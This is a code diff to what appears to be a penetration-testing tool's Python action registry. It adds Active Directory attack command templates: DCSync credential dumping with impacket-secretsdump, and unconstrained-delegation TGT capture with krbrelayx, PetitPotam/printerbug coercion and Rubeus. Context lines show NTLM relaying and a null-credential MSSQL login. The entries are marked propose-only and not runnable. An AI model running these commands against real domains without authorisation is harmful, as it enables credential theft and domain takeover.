@@ -246,6 +246,16 @@ ACTION_REGISTRY: dict[str, Action] = {
         ["impacket-ntlmrelayx -tf relay_targets.txt -smb2support -i"],
         risk="propose", runnable=False, outputs="raw",
         note="Relay to SMB-signing-off hosts; pair with a coercion (PetitPotam/printerbug)."),
+    "dcsync_secretsdump": _a("dcsync_secretsdump",
+        ["impacket-secretsdump -just-dc <DOMAIN>/<USER>:<PASS>@$IP"],
+        risk="propose", runnable=False, outputs="raw",
+        note="DCSync the DC (principal has replication rights); dumps NTDS hashes -> DA."),
+    "unconstrained_delegation_capture": _a("unconstrained_delegation_capture",
+        ["# Coerce DC auth to the unconstrained host, capture the TGT:",
+         "python3 krbrelayx.py -t ldap://$IP  # + PetitPotam/printerbug coercion",
+         "impacket-getST / Rubeus monitor  # extract the captured DC$ TGT"],
+        risk="propose", runnable=False, outputs="raw",
+        note="Unconstrained delegation: coerce the DC, capture its TGT, then DCSync."),
 
     # --- Traditional: MSSQL / WinRM / SSH / RDP / FTP ---
     "netexec_mssql": _a("netexec_mssql", ["nxc mssql $IP -u '' -p ''"], outputs="raw"),
